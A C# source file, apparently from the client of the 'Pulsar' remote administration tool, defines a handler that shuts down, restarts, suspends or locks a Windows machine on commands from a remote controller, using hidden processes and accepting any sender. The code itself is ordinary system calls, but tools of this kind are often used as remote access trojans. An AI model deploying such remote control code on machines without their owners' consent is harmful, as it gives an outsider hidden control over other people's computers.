using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.Actions;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace Pulsar.Client.Messages
{
    public class ShutdownHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoShutdownAction;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            if (message is DoShutdownAction msg)
                Execute(sender, msg);
        }

        private void Execute(ISender client, DoShutdownAction message)
        {
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                switch (message.Action)
                {
                    case ShutdownAction.Shutdown:
                        client.Send(new SetStatus { Message = "Client is shutting down..." });
                        startInfo.FileName = "shutdown";
                        startInfo.Arguments = "/s /t 0";
                        Process.Start(startInfo);
                        break;

                    case ShutdownAction.Restart:
                        client.Send(new SetStatus { Message = "Client is restarting..." });
                        startInfo.FileName = "shutdown";
                        startInfo.Arguments = "/r /t 0";
                        Process.Start(startInfo);
                        break;

                    case ShutdownAction.Standby:
                        client.Send(new SetStatus { Message = "Client entering standby mode..." });
                        Application.SetSuspendState(PowerState.Suspend, true, true);
                        break;

                    case ShutdownAction.Lockscreen:
                        client.Send(new SetStatus { Message = "Client screen is being locked..." });
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "rundll32.exe",
                            Arguments = "user32.dll,LockWorkStation",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                            UseShellExecute = false
                        });
                        break;

                    default:
                        client.Send(new SetStatus { Message = "Unknown shutdown action requested." });
                        break;
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Shutdown action failed: {ex.Message}" });
            }
        }
    }
}
